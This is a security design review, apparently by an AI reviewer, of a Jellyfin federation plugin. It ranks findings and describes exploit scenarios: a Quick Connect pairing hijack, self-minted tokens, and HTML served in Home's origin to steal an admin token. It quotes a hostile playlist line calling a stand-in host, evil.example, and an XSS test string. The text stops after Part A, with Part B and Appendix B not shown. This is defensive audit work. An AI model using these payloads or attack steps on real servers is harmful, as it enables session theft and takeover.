# WARDEN review 01: DESIGN.md v1 and the spike code

Reviewer: WARDEN (security). Date: 2026-10-14. Mode: read-only. Nothing was built, run or deployed, and no lab server was touched.
Inputs read in full: `CLAUDE.md`, `docs/DESIGN.md` (1267 lines), `docs/spike-01-playbackinfo.md`, `docs/research/scout-01.md`, `docs/ROADMAP.md`, every file under `src/`, `tools/`, `lab/`, `build.yaml`, csproj, `.editorconfig`, and the full git history (`git log --all -p`).
Jellyfin 12.1 source (`v12.1`, commit ee91c75) and jellyfin-web `v12.1` were used to check claims. Citations like `QuickConnectManager.cs:93` are relative to `jellyfin/` in that clone.

## How to read the evidence labels

- **Verified (source)**: I read the line in the Jellyfin 12.1 / jellyfin-web 12.1 source.
- **Verified (code)**: I read the line in this repo.
- **Derived**: follows from the code plus a spec or library behavior I did not execute (HTTP, WHATWG URL, hls.js). Marked as such.
- **Not executed**: any exploit below is a reading of the code. I could not run it (read-only rule). Pilot should turn each into a fixture (Appendix B).

## Summary

| Severity | Part A (DESIGN.md) | Part B (spike code) | Total |
|---|---|---|---|
| Critical | 0 | 1 | 1 |
| High | 4 | 3 | 7 |
| Medium | 10 | 5 | 15 |
| Low | 6 | 5 | 11 |

Several findings share a root cause (A-2/B-1, A-3/B-3, A-4/B-6). Distinct root causes: about 28.

**Verdict.** The architecture is sound and the threat model is unusually good for a first draft. The sentinel `.strm`, grants instead of a stateless proxy, header-only peer auth, no redirects, whitelisted PlaybackInfo, and the canary are all correct and should stay. I found no way to reach peer data through the MVC filter by confusing its routing, because peer data is reachable only through the plugin's own handlers. The serious problems are elsewhere: the pairing flow (Quick Connect is hijackable, verified), the HLS rewrite rules (denylist-shaped, and the spike version leaks the caller's token), Content-Type handling (Jellyfin sets no nosniff/CSP at all, verified), and the auth specification for the routes core leaves anonymous. All four are fixable in the document before Kiro starts.

### Mandatory DESIGN.md changes before Kiro starts the MVP

1. **Pairing (A-1).** Quick Connect alone is not safe as the trust root. Add Home-side "request vanished" detection (poll at 1 s), a plugin-native invite path for plugin-to-plugin pairing, and an Initiate shield on the Peer.
2. **HLS rewriter (A-2).** Replace R2/R3 with a closed grammar: tag allowlist, positive URI regexes, emitted lines built from captured integers only. Add the hostile fixtures in Appendix B.
3. **Response hardening (A-3).** Exact Content-Type allowlist per route (remove `text/*`), always emit our own type, and add `nosniff`, `CSP: sandbox`, `no-referrer` to everything the plugin serves.
4. **CallerContext (A-4).** Specify it as: identity from `HttpContext.User`, default policy via `IAuthorizationService`, non-null enabled user, `IsVisibleStandalone`. Ban `GetAuthorizationInfo` outside it. Add the negative test matrix as an acceptance criterion for K7/K8.
5. **Visibility default (A-6).** Answer open question 1 with "explicit user selection, default admin only", and treat peer-supplied ratings as untrusted.
6. **Config persistence (A-14).** Do not keep peer topology only in Jellyfin's XML (core wipes it on any read error).
7. **Caps (A-10, A-11, A-12).** Per-peer disk quota, tighter image rules, a new-items-per-sync guard, and per-field sanitization rules for PlaybackInfo `MediaStreams` and provider ids (they are load-bearing XSS controls).
8. **Revocation text (A-9).** Correct section 4.3: a share-user token can mint more tokens for itself (verified), so "delete the device" is not a revoke. Pull a per-share transcode cap into MVP.
9. **Correct four claims that are not true as written:** T13 (Id is public, so the pin is accident detection), T11 (anti-rebinding does not hold in proxy mode), T26 (DeviceProfile forwards device names), T30 (Jellyfin verifies MD5, not SHA-256).

---

# PART A: DESIGN REVIEW (docs/DESIGN.md)

Findings are ranked within each severity. "Blocks MVP" means: do not start or merge the listed task until the design text and acceptance criteria are changed.

## A. Critical

None. Nothing in the design as written gives a remote attacker a direct, unauthenticated path to Home admin or to peer data. The High items below are the ones that come closest.

## A. High

### A-1 [High] Quick Connect pairing can be hijacked, and the Peer admin approves blind

- **Where:** section 1.1, 4.1 step 3, 4.2 steps 3-5, T24 (8.3), K3/K4, T-PAIR-1..5.
- **Evidence (verified, source):**
  - `POST /QuickConnect/Initiate` is anonymous (`QuickConnectController.cs:54`, no `[Authorize]`). No per-IP limit and no cap on pending requests.
  - Pending requests are keyed by the **6-digit code**, not by the secret: `_currentRequests[code] = result` (`QuickConnectManager.cs:93`). The code space is 100000..999999, i.e. 900,000 values (`:117-133`). A later Initiate that draws the same code silently replaces the earlier entry.
  - `AuthorizeRequest(userId, code)` looks up by code and immediately mints a token for whichever entry holds that code at that moment (`:136-165`).
  - Device name and app name are taken from the **Initiate** request headers (`:85-91`), so they are attacker-chosen.
  - `ExpireRequests()` walks every pending entry on every Initiate, Connect and Authorize call (`:80,101,139`): a flood is also an O(n) CPU amplifier.
- **Exploit scenario:** Attacker can reach the Peer (public HTTPS peer, any tailnet member, or the LAN). They loop `POST /QuickConnect/Initiate` with `Device="Federation: Bob's Home"`. The Home admin starts pairing; Home's entry holds code C. Each attacker call has a 1 in 900,000 chance of drawing C and replacing Home's entry. Probability the entry is replaced before the Peer admin approves, after N attacker calls, is `1 - (1 - 1/900000)^N`. At 1,000 req/s and a 2 minute approval delay that is about 12%; at 620,000 calls it is 50%. The Peer admin types C (received from the real friend). The plugin calls `AuthorizeRequest`, which mints a share-user token for the **attacker's** secret. The attacker redeems it. Home just sees its request disappear and the admin assumes it expired. The attacker now holds a valid share-user token: read access to the shared libraries, and (A-9) the ability to mint more tokens.
  - The design's mitigation, "the code is useless without Home's secret" (T24), is true for a passive observer but not for an attacker who initiated the request they get approved.
- **Fix:**
  1. **Home-side hijack detection (works with stock Peers).** Poll `GET /QuickConnect/Connect?secret=` every 1 s, not 3 s. If it returns 404 before the local 10 minute expiry, treat it as a hijack signal: abort, show "your pairing request was replaced; do not approve this code; if your friend already approved, disable the share user and remove its devices", never silently restart with a new code. A replaced entry is the only way Home's secret disappears early.
  2. **Plugin-to-plugin pairing without Quick Connect.** The Peer admin clicks "Invite"; the plugin makes a one-time invite of at least 128 bits (base32, shown once, 15 minute expiry, bound to the share user). Home redeems it at one endpoint, `POST /Federation/Pair/Redeem {invite, homeNonce}`; the Peer calls `ISessionManager.AuthenticateDirect` for the share user and returns the token. This is the only endpoint that must be anonymous. Allow it only with: constant-time compare, global limiter (5 per minute), invite burned after 3 failures, no expired-versus-wrong oracle, body at most 1 KB. Whitelist exactly this action in the reflection test, with a comment. (This is a small deliberate exception to the "no anonymous" rule; the alternative, an invite checked by Quick Connect, does not exist.)
  3. **Initiate shield on the Peer.** The Peer role already installs a global MVC filter (8.4). Use it to rate-limit `POST /QuickConnect/Initiate` (for example 10 per minute per remote IP, 200 pending in total) while any Share exists.
  4. **After approval**, the Peer UI lists the new device with first-seen time and highlights any device the admin did not expect.
- **Add tests:** T-PAIR-6 (flood 5,000 Initiates during a pairing: Home must report "request replaced" or the limiter must hold), T-PAIR-7 (attacker-named device is shown verbatim as text).
- **Blocks MVP:** Yes (K3, K4).

### A-2 [High] The HLS rewrite rules are shaped like a denylist; relative-looking lines and non-`URI=` attributes can still become attacker URLs

- **Where:** section 6.4 rule R2 ("Tags without a URI are copied verbatim"), R3 prose, T-SEC-7 fixtures. The spike has the concrete bug (B-1).
- **Issue:** R3 correctly says "no scheme", but R2 copies every tag that lacks `URI=` verbatim, and R2 drops "any other tag with `URI=`" by attribute name. HLS has other URL-bearing attributes: `#EXT-X-CONTENT-STEERING:SERVER-URI=`, `#EXT-X-DATERANGE` with `X-ASSET-URI` / `X-ASSET-LIST` (HLS Interstitials), `#EXT-X-SESSION-DATA`, `#EXT-X-DEFINE`. jellyfin-web ships hls.js 1.6.16 (`package.json:113`) with default configuration (`plugins/htmlVideoPlayer/plugin.js:567-575` sets no interstitial or steering options). **I could not verify which of those tags hls.js 1.6.16 acts on**, so treat this as "do not depend on it".
- **Exploit scenario:** A hostile peer's playlist contains `#EXT-X-DATERANGE:ID="a",X-ASSET-URI="https://collect.evil.example/p.m3u8"`. If the client library honors it, the end user's browser contacts the attacker directly: the peer learns the **end user's real IP** (the design promises it never sees that, T26), and can inject content into the player. The rewritten-line variant is worse and exists in the spike (B-1: caller's token sent to the attacker).
- **Fix:** make the rewriter a closed grammar.
  - **Tag allowlist** (everything else is dropped, not copied): `EXTM3U`, `EXT-X-VERSION`, `EXT-X-TARGETDURATION`, `EXT-X-MEDIA-SEQUENCE`, `EXT-X-PLAYLIST-TYPE`, `EXT-X-ENDLIST`, `EXT-X-INDEPENDENT-SEGMENTS`, `EXT-X-DISCONTINUITY[-SEQUENCE]`, `EXTINF`, `EXT-X-BYTERANGE`, `EXT-X-MAP` (rebuilt), `EXT-X-STREAM-INF` (rebuilt from `BANDWIDTH, RESOLUTION, CODECS, FRAME-RATE, VIDEO-RANGE, AUDIO, SUBTITLES`), `EXT-X-MEDIA` (rebuilt, already in R2).
  - **Positive URI grammar:** a URI line is accepted only if the whole line matches R4, R5 or R5b. "Relative" must mean "matches one of the three regexes", never "does not contain `://`". Emitted lines are built from captured integers, never from input text.
  - Use ASCII-only classes and `StringComparison.Ordinal` in these regexes. .NET `\d` matches non-ASCII digits and `IgnoreCase` character classes can match U+212A (Kelvin sign); use `[0-9]` and `RegexOptions.ECMAScript` or explicit ranges.
  - Add the fixtures in Appendix B (single-slash and no-slash scheme prefixes, `X-ASSET-URI`, `SERVER-URI`, `data:`, control characters inside a URI, unquoted `URI=`, duplicate attributes) to T-SEC-7.
- **Blocks MVP:** Yes (K9).

### A-3 [High] Proxied responses can execute as HTML in Home's origin; Jellyfin sets no nosniff, CSP or framing headers

- **Where:** section 6.3 steps 4-5, 6.4 content-type rules, **6.6 ("`text/*` or `application/x-subrip`")**, T12. Spike counterpart B-3.
- **Evidence (verified, source):** a search of `Jellyfin.Server`, `Jellyfin.Api` and `Emby.Server.Implementations` finds no `X-Content-Type-Options`, `Content-Security-Policy`, `X-Frame-Options`; the middleware pipeline in `Jellyfin.Server/Startup.cs:176-250` adds none. Core's subtitle routes are declared `[ProducesFile("text/*")]` (`SubtitleController.cs:210,297`); the design copies that looseness, and `text/html` is inside `text/*`. jellyfin-web keeps the session token in browser storage on the same origin (credential store lives in `jellyfin-apiclient`, not in this clone; **not re-verified**).
- **Exploit scenario:** The Peer admin F also has an ordinary user on Home (very common: the friend is on both servers). F's Peer answers the subtitle request with `Content-Type: text/html` and a script. F sends the Home admin A a link such as `https://home/Federation/Subtitles/<id>/2/Stream.vtt?ApiKey=<F's own token>` ("this subtitle is broken, can you check?"). Home serves a peer-controlled HTML page from its own origin; A's stored credentials are readable; A's token is stolen; A can install plugins, which is code execution on Home. Preconditions: hostile peer, a Home account, one admin click.
- **Fix:**
  1. Exact Content-Type allowlist per route, and **always emit our own type** derived from the route or format: `vtt` -> `text/vtt`, `srt` -> `application/x-subrip`, `ass`/`ssa` -> `text/x-ssa`, media from the container, playlists fixed. If the peer's type is not on the allowlist, return 502.
  2. On every response the plugin produces or proxies: `X-Content-Type-Options: nosniff`, `Content-Security-Policy: default-src 'none'; sandbox`, `Referrer-Policy: no-referrer`, `Cross-Origin-Resource-Policy: same-origin`, `Cache-Control: no-store`, and `Content-Disposition: attachment` for anything that is not media.
  3. Test: fakepeer returns `text/html` (and `image/svg+xml`) for every proxied route; assert Home's response type and headers.
- **Blocks MVP:** Yes (K8, K9, K10).

### A-4 [High] `CallerContext` is the most security-critical new component and is under-specified; the obvious implementation is wrong in three verified ways

- **Where:** section 2 component 16, 6.1 intro, 6.3 step 1, T8, K7/K8 acceptance, Appendix A ("unverified: IAuthorizationService default-policy evaluation inside a filter").
- **Why it matters:** for stream and subtitle routes core has **no** `[Authorize]`. The plugin's filter is the only thing between the internet and peer bytes, and the "no `[AllowAnonymous]`" reflection test cannot see it (the filter short-circuits core's anonymous actions, which carry no attribute at all).
- **Evidence (verified, source):**
  - `HttpContext.User` is populated on anonymous routes only when `AuthService.Authenticate` succeeds (`AuthService.cs:23-40`, `CustomAuthenticationHandler.cs:46-90`); failures leave an anonymous principal. The default scheme is `CustomAuthentication`, so Appendix A is right about that.
  - `IAuthorizationContext.GetAuthorizationInfo` (the spike's choice) only resolves token -> device -> user. It does **not** check `IsDisabled`, remote access or schedule. Those live in `AuthService.cs:35` and `DefaultAuthorizationHandler.cs:66-87`. A disabled user's token comes back as `IsAuthenticated = true, User != null` (`AuthorizationContext.cs:137-166`).
  - `GetItemById<T>(id, user)` returns the item for **any** id when `user` is null (`LibraryManager.cs:4081-4084`). A token whose user was deleted resolves to `User = null` while `IsAuthenticated` stays true.
- **Exploit scenario:** CallerContext is built from the spike pattern. (a) An admin disables a user, but that user's existing token keeps streaming federated titles through the filter. (b) A deleted user's token still works. (c) A child profile's access schedule and a remote-access ban are ignored for federated items only.
- **Fix:** specify CallerContext exactly:
  1. Read identity from `HttpContext.User` (already filtered by `AuthService`): authenticated, role claim, `InternalClaimTypes.UserId`, `IsApiKey` claim. API key -> 403.
  2. Run `IAuthorizationService.AuthorizeAsync(User, null, await IAuthorizationPolicyProvider.GetDefaultPolicyAsync())`. Failure -> 401/403.
  3. `IUserManager.GetUserById(userId)` must be non-null and not disabled; **throw** if null (never pass null into `GetItemById` or `IsVisibleStandalone`).
  4. `item.IsVisibleStandalone(user)`, else 404; check `EnableMediaPlayback`.
  5. Add `GetAuthorizationInfo` and `GetItemById(Guid, User?)` with a nullable user argument to `BannedSymbols.txt` for plugin code outside CallerContext.
  6. Add acceptance test **T-SEC-15, a negative matrix**: {no token, garbage token, valid token of a disabled user, token of a deleted user, logged-out token, API key, user with `EnableRemoteAccess=false` from a non-LAN IP, user outside `AccessSchedule`, user without library access, user whose parental rating excludes the item, other user's grant id} x {PlaybackInfo, static GET, static HEAD, Federation/Subtitles, Federation/Hls master, main, segment}. Every cell asserted.
- **Blocks MVP:** Yes (K7, K8 acceptance criteria).

## A. Medium

### A-5 [Medium] Any local user with library access can starve a peer, and every other Home user, for hours

- **Where:** 3.5 (direct-play grants idle-expire after 2 h), 6.2 step 1 (slots reserved at PlaybackInfo), 6.9 (defaults 2 per user, 2 per peer).
- **Exploit:** A user calls PlaybackInfo on two titles and never streams. The user's 2 slots and the peer's 2 slots are held for 2 h and can be renewed by repeating the call before expiry. Everyone else on Home gets `RateLimitExceeded` for that peer. With several accounts the global grant cap (200, "evict oldest") can also be used to push out other users' grants.
- **Fix:** take a slot at the first byte / first segment request and release it on `PlaybackStopped`, `RequestAborted` or a short idle (2 min); a grant by itself is cheap and bounded (4 per user). Evict only the same user's oldest grant first. Make the peer default at least 4, or "no per-peer cap unless the Peer sets one", with a per-user share of at most 50% of the peer's slots.
- **Blocks MVP:** No; fix in K8.

### A-6 [Medium] Federated content is visible to everyone on Home by default, and parental controls depend on ratings supplied by the peer

- **Where:** 4.2 step 7, open question 1 (section 12), 5.5, NFO `<mpaa>`, T9.
- **Evidence (verified, source):** `IsVisibleStandalone` includes the item's `OfficialRating` and the user's `BlockUnratedItems` (`BaseItem.cs:1865-1905`) and folder access via `EnableAllFolders` (`BaseItem.cs:1553-1585`).
- **Concerns:**
  1. The Peer agreed to share with the Home **admin**, not with every account on Home (which may be a public server with invite sign-ups). A new library is visible to all `EnableAllFolders` users automatically.
  2. The peer chooses the rating. A hostile or careless peer labels adult titles `G` or leaves them blank; restricted child profiles on Home see them.
- **Fix:** answer open question 1 with "no". Wizard step 4 must require explicit user selection (default: the admin only) and must list `EnableAllFolders` users with a one-click "limit to an explicit list". Offer "add the `Federated` BlockedTag to every user that has a parental rating limit" as a button. Add a setting "treat peer ratings as untrusted": write `<mpaa>` only if it is in the standard rating table, otherwise empty, so `BlockUnratedItems` applies. Document it in the Home README.
- **Blocks MVP:** The wizard default, yes (K11).

### A-7 [Medium] The peer identity pin is not an authenticator, and the token is sent before it is checked

- **Where:** T13, 4.2 step 5, 4.3 ("checked every sync and health transition").
- **Issue:** `Id` comes from the anonymous `/System/Info/Public`, so any host that ever answered a request can replay it. An imposter at the same URL (reused MagicDNS name, DNS hijack, ARP spoof on a LAN, compromised tunnel) passes the pin. The pin also runs only on "sync and health transitions", while the token is attached to **every** call, including the first on a fresh connection, and the 60 s health call is itself authenticated.
- **Fix:** present it honestly as accident detection (server reset, IP reuse), which is still worth keeping. Add: on every new connection, do an unauthenticated `System/Info/Public` pin check first and only then send the token. For Public peers also pin the TLS leaf public key on first use, with an explicit "re-trust" action in addition to CA validation. For Tailnet peers require an IP literal in `100.64.0.0/10` / `fd7a:115c:a1e0::/48` or a `*.ts.net` name. For LAN http, state in the UI that the token travels in cleartext, and require a per-peer acknowledgement.
- **Blocks MVP:** No.

### A-8 [Medium] AddressPolicy gaps: proxy mode bypasses the anti-rebinding claim; some metadata ranges are not blocked

- **Where:** T11, component 7, K2 acceptance ("rebinding simulation blocked").
- **Issues:**
  1. With a proxy configured, `SocketsHttpHandler.ConnectCallback` is invoked for the **proxy** endpoint, not the target, and SOCKS5 resolves names at the proxy. "Resolves and checks every IP at connect time (defeats DNS rebinding)" is false in proxy mode.
  2. Class ranges are broader than the block list: LAN (`fc00::/7`) includes the AWS IPv6 metadata address `fd00:ec2::254`; Tailnet (`100.64.0.0/10`) includes Alibaba's metadata address `100.100.100.200` (only `100.100.100.100` is carved out); "global unicast" for Public should also exclude `192.0.0.192` (Oracle) and consider `168.63.129.16` (Azure host). Also normalize NAT64 `64:ff9b::/96`, 6to4, Teredo, `::`, `0.0.0.0`, decimal/octal/hex IPv4 and IPv4-mapped IPv6 forms before classification. Reject userinfo, backslashes and non-punycode hosts.
- **Weight:** low in practice. Only Home admins can enter peer URLs, so SSRF here is mostly admin-mistake and defense in depth. The real SSRF vector (peer-driven redirection) is closed by "no redirects, no absolute URIs".
- **Fix:** in proxy mode require Tailnet class with an IP literal or `*.ts.net`; extend the block list; table-driven unit tests; state in the design that SSRF from this field is admin-only.
- **Blocks MVP:** No.

### A-9 [Medium] Revocation is weaker than section 4.3 says: the share user can mint more tokens for itself (verified), and nothing caps transcodes on the Peer until phase 5

- **Where:** 4.3 ("Revoke from the Peer", "Stock alternative: delete the device"), T1, T20, phase-5 `Share/Rotate`.
- **Evidence (verified, source):** `POST /QuickConnect/Authorize` is `[Authorize]` and accepts the caller's own user id (`QuickConnectController.cs:104-113`, `RequestHelpers.cs:62-83`); `Initiate` is anonymous. A holder of one share-user token runs Initiate, Authorize(self), AuthenticateWithQuickConnect and has a second, independent device and token.
- **Exploit:** a leaked token (T1) or a hostile ex-friend Home. The Peer admin deletes "Federation: Home" in the dashboard (the stock instruction in 4.3). The attacker's self-minted device survives. Separately, a token holder can start unlimited ffmpeg jobs on the Peer by calling PlaybackInfo + master.m3u8 with new PlaySessionIds: `MaxActiveSessions` does not bound this (one DeviceId = one session) and `RemoteClientBitrateLimit` bounds bitrate, not count.
- **Fix:** (1) rewrite the stock-Peer instructions: **disable the user first** (`IsDisabled`), then sign out all devices, then delete or recreate it. The plugin's revoke already does this; have it verify afterwards that no device remains. (2) State that phase-5 `Share/Rotate` is, by design, the same self-minting capability, so rotation does not by itself limit a thief. (3) Pull a per-share concurrent-transcode cap into MVP: the Peer hardening filter (K13) already sits on the share user's PlaybackInfo; count active transcodes for the share user and return 429 above N.
- **Blocks MVP:** The text fix, yes. The cap: should.

### A-10 [Medium] A hostile peer can fill Home's disk and bloat its database while staying inside every stated cap

- **Where:** 3.3 (50,000 entries), 5.4 (10 MB per image), 5.5 (People 15 x 128, Genres 32 x 64, Studios 16 x 128), 5.2 (only deletions are guarded).
- **Arithmetic:** 50,000 titles x 2 images x 10 MB = **1 TB** per peer (the 300 KB figure is the honest case). 50,000 titles x 15 random unique actor names = 750,000 `Person` rows plus refresh work. Additions are unguarded: the peer can add or churn 49,000 titles per sync.
- **Fix:** per-peer disk quota (default 2 GB; stop fetching images beyond it); poster cap 2 MB and backdrop cap 4 MB; cap the total distinct people/genre/studio strings per peer (for example 20,000) and write at most 5 actors in MVP; a "new items per run" guard (above `max(500, 20%)` of the catalog -> hold like the deletion guard); show stub count and disk use in the Peer detail screen.
- **Blocks MVP:** The quota and the new-items guard: should (K5, K6).

### A-11 [Medium] Image decoder exposure (WebP) and large canvases

- **Where:** 5.4 and T17 ("residual risk accepted").
- **Issue:** Core will decode whatever the plugin stores (Skia). The comparison "core would decode any image from a metadata provider too" understates it: a friend's server is a different trust level from TMDb, and libwebp has had an in-the-wild code-execution class (2023). An 8000 x 8000 image is 256 MB decoded; with image concurrency 4 and the resizer, a few of them exhaust RAM on a small host.
- **Fix:** accept JPEG and PNG only (request `format=Jpg` from the peer and reject everything else, including WebP); dimension cap 4000 x 6000 and at most 16 megapixels; process images serially; a size cap of 2 MB (see A-10). Optional later: decode/re-encode in a child process with resource limits.
- **Blocks MVP:** No.

### A-12 [Medium] Latent XSS sinks in jellyfin-web, fed by data the plugin writes; the provider-id regexes are load-bearing

- **Where:** 5.5, 6.2 (`MediaStreams` "copied field by field"), component 13b (StubEnricher), phase 6.
- **Evidence (verified, jellyfin-web v12.1):**
  - `MediaStream.DisplayTitle` is concatenated into `<option>` markup with `innerHTML` and **no escaping** on the item page (`src/apps/legacy/controllers/itemDetails/index.js:259, 282, 312`). Core builds `DisplayTitle` from the stream's `Title` and `Language`.
  - `ExternalUrls[].Url` and `HomePageUrl` go into `href="..."` unescaped (`index.js:731-737`). `ExternalUrls` are built from provider ids.
  - By contrast Overview is DOMPurify-sanitized (`index.js:924`), titles, roles and tags are `escapeHtml`-ed, and the OSD track menu goes through `actionSheet` which escapes (`actionSheet.ts:275`). No problem there.
- **Consequences for the design:**
  1. The provider-id regexes in 5.5 are XSS controls, not hygiene. Folder names, `<uniqueid>` and any URL material must use the **parsed integer/`tt` form**, never the original string. Test with `tt0133093"><img src=x onerror=alert(1)>`.
  2. StubEnricher and the phase-6 plan must never write peer `MediaStream.Title` / `Language` onto stub items: every user's item page would then run peer-controlled HTML.
  3. The PlaybackInfo `MediaStreams` copy (6.2) needs per-field rules as strict as 5.5 (strip control and bidi characters, cap length, regex for `Codec`, `Language`, `Type`, `Profile`; `Title`/`DisplayTitle` recomputed locally or dropped). Other clients (Moonfin, native apps) render differently, so assume nothing about their escaping.
- **Blocks MVP:** The spec text, yes (cheap to add now, expensive after K8/K11).

### A-13 [Medium] The Peer-side hardening filter is right in principle but under-specified for a global filter running on strangers' servers

- **Where:** 8.4, K13, T-SEC-12.
- **Issues:**
  1. The route list is hand-written. Anonymous media routes that take an item id in 12.1 (verified, source): `Videos/{itemId}/stream[.{container}]` (`VideosController.cs:314,552`), `Audio/.../stream`, the two subtitle `Stream.{fmt}` routes (`SubtitleController.cs:208,295`), `Videos/{videoId}/{mediaSourceId}/Attachments/{index}` (`VideoAttachmentsController.cs:50`), the **legacy HLS segment routes** `Videos/{itemId}/hls/{playlistId}/{segmentId}.{ext}` and `Audio/{itemId}/hls/...` (`HlsSegmentController.cs`, comment "Can't require authentication just yet"), and item images `Items/{itemId}/Images/{type}` (`ImageController.cs:552`, lower sensitivity). The attachments and legacy HLS routes are not all in the 8.4 list.
  2. No failure policy is stated. A bug in a global filter on a stranger's server breaks that server's playback.
  3. "Is the item inside a shared library" needs a cache; walking ancestors on every Range request is expensive.
- **Fix:** enumerate the route set **programmatically** at startup from `EndpointDataSource` (endpoints with no `IAuthorizeData` whose template contains an item-id parameter), and add a CI test that diffs that set against the table for each Jellyfin release. State the failure policy: any exception inside the filter -> `next()` (fail open for unshared items), plus a counter and a log line. Cache the shared-library decision per item for 60 s. Keep `LogOnly` as the default. Also use this filter for the Initiate shield (A-1) and the transcode cap (A-9).
- **Blocks MVP:** The spec for K13, yes.

### A-14 [Medium] Core wipes plugin configuration on any read error and writes it non-atomically

- **Where:** 3.1, 3.2, component 3 (`ConfigValidator`), T27, T-REG-1.
- **Evidence (verified, source):** `BasePluginOfT.cs:184-198`: on **any** exception while loading, core creates a default configuration and saves it over the file. `SaveConfiguration` (`:150`) is a plain `SerializeToFile` with no temp file and rename. A torn write (power loss, full disk), or an XML written by a newer schema, silently resets `Peers` and `Shares` to empty. Secrets and catalogs on disk are then orphaned. A `ConfigValidator` that throws during load triggers the same path.
- **Fix:** keep peer and share topology in the plugin's own atomic store (`federation/state.json`: temp file, fsync, rename, `.bak`), and use the XML only for non-critical toggles. `ConfigValidator` must never throw from load (clamp or disable instead). A startup self-check relinks orphaned `peers/<key>/` folders to `secrets.enc` entries.
- **Blocks MVP:** Yes (K1).

## A. Low

### A-15 [Low] The DeviceProfile forwarded to the Peer contains client identity; this contradicts T26

- **Where:** 6.2 step 3 ("`DeviceProfile` (as validated raw JSON)"), T26 ("no usernames, IPs or device names forwarded").
- **Issue:** jellyfin-web sets `Name` to the browser name; other clients add model and manufacturer-style fields. The peer therefore learns what devices the Home users have.
- **Fix:** forward a rebuilt profile with only `MaxStreamingBitrate`, `MaxStaticBitrate`, `DirectPlayProfiles`, `TranscodingProfiles`, `CodecProfiles`, `SubtitleProfiles`, `ContainerProfiles`, `ResponseProfiles` (all with list-length caps) and a fixed `Name`. Update T26. Together with the tag allowlist in A-2 this keeps the end user's IP and device out of the Peer's sight.
- **Blocks MVP:** No.

### A-16 [Low] Secret store: the claim is honest, but details are missing

- **Is AES-GCM better than file permissions?** Marginally. In the default Linux mode the key is in the same directory as the ciphertext, so against code running as the Jellyfin user, a `/config` volume backup, or a disk image it equals a 0600 plaintext file. Its real benefit is moving the token out of the world-readable XML that `GET /Plugins/{id}/Configuration` returns and people paste. **Sections 0.5 and 8.2 state exactly this; the claim is honest.** Say the same in the README, and recommend the env/Docker-secret key.
- **Gaps:**
  - Windows DPAPI at `LocalMachine` scope lets any local account on that machine decrypt. Use `CurrentUser` (the service account) with entropy.
  - Specify: fresh random 96-bit nonce per save, AAD = schema + version, key derived with HKDF and a context label, atomic replace (`File.Replace`), and refuse to start (do not regenerate) when authentication fails.
  - `UnixCreateMode` is ignored on CIFS/NFS/NTFS mounts: detect and warn "treat as plaintext".
  - Jellyfin's built-in 12.x backup copies only specific folders (`BackupService.cs:407-448`) and does not include `<DataPath>/federation/` or `plugins/configurations`. This is a point in favor (secrets do not ride in exported backups) but means a restore requires re-pairing; document it.
- **Blocks MVP:** No.

### A-17 [Low] Supply chain: T30 is factually wrong, and no signing is planned

- **Evidence (verified, source):** Jellyfin verifies an **MD5** of the plugin zip (`InstallationManager.cs:586`), not SHA-256. MD5 gives corruption detection only; authenticity is whoever controls the repository and manifest.
- **Fix:** 2FA with hardware keys on the GitHub account, protected branches, required review, signed tags, a signed release with provenance attestation or a cosign signature published beside the manifest, `packages.lock.json` with `RestoreLockedMode` in CI, pinned analyzers, and a `SECURITY.md` with a disclosure address. Correct T30.
- **Blocks MVP:** No (before the first public release).

### A-18 [Low] The share-user policy checklist in 4.1 is shorter than the spike's

- **Missing from 4.1 (fields verified to exist, `UserPolicy.cs:74-197`):** `EnableSharedDeviceControl=false`, `EnableRemoteControlOfOtherUsers=false`, `EnableMediaConversion=false`, `EnableAllChannels=false` / `EnabledChannels=[]`, `EnableLyricManagement=false`, `EnableUserPreferenceAccess=false`, `SyncPlayAccess=None`, `EnableContentDeletionFromFolders=[]`. The spike's setup script sets several of them. I did not verify the defaults new users get, so set them explicitly.
- **Fix:** apply the full list; the Peer plugin re-verifies the policy on the 60 s health tick and on startup, and repairs drift (an admin editing the user in the dashboard). Home warns if `/Users/Me` shows any of them as true.
- **Blocks MVP:** No (K4 acceptance should list them).

### A-19 [Low] Grants expire only on idle and are never re-validated

- **Where:** 3.5, 6.4.
- **Issue:** HLS grants slide (10 minutes idle). A client that polls keeps a grant forever, so a user whose library access was revoked, or who was disabled (the token check still fails then; but a *permission* change such as a new BlockedTag or schedule does not), keeps streaming until it stops.
- **Fix:** absolute lifetime (12 h), and a cheap re-check of `IsVisibleStandalone` plus "user enabled" every 5 minutes inside the controller.
- **Blocks MVP:** No.

### A-20 [Low] Smaller design notes (batched)

1. **Do not allow sharing federated libraries.** The Peer role's Shares screen must refuse libraries under `StubRoot`, otherwise phase 5 (two-way) creates chains and loops and doubles the proxy hops.
2. **Merge versions.** The filter keys on the route item id and ignores `mediaSourceId`. If an admin merges a stub with a local copy (core `MergeVersions`, admin-only), core serves the stub's sentinel source under the local item's id. Safe (the sentinel carries only a stubKey) but broken; detect linked alternates and warn.
3. **Route table completeness.** Add `POST LiveStreams/Open` and `Items/{id}/File` for completeness ("every route that accepts an item id"). Harmless today because of the sentinel.
4. **User tokens in debug logs.** Core's `ResponseTimeMiddleware` logs the full request URL, including `ApiKey=<user token>`, at Debug level (`ResponseTimeMiddleware.cs:53-55`). Our URLs carry the token in the query by necessity. T4 should say "peer token", and the README should tell users to redact Debug logs before sharing them.
5. **CSRF (T25) is not applicable.** Core authentication never reads cookies (`AuthorizationContext.cs:60-118` reads only the `Authorization` header and `ApiKey` query). The rule "admin endpoints reject `ApiKey` in the query" is unnecessary and breaks API-key automation; keep admin writes as POST/PUT/DELETE for hygiene.
6. **JSON depth** is 32 in 5.1 and 64 in 6.2: pick 32.
7. **Static route request rate.** 6.9 limits concurrency (6 per user) but not request rate; add a per-user limiter (for example 20 per second, burst 100) so a Range flood does not become a peer flood.
8. **PathSanitizer details** (design is sound): truncate on a rune boundary, re-trim dots and spaces after truncation (harmless today because a suffix is always appended), detect collisions case-insensitively and normalization-insensitively, and also strip U+200E/U+200F/U+061C from titles (the bidi list stops at the overrides).
9. **Quick Connect exceptions.** `AuthorizeRequest` throws `ResourceNotFoundException` for unknown codes and `InvalidOperationException` when already authorized (`QuickConnectManager.cs:141-149`); the Shares UI must map both to a clean message.
- **Blocks MVP:** No.

## A. Answers to the specific questions

| Question | Answer |
|---|---|
| Auth on every route | The route list in section 2 is complete and has no anonymous entry. One deliberate exception is needed if A-1 option 2 is adopted (`Federation/Pair/Redeem`). The reflection test is necessary but not sufficient: the filter short-circuits core's anonymous actions, so it needs the T-SEC-15 matrix (A-4). |
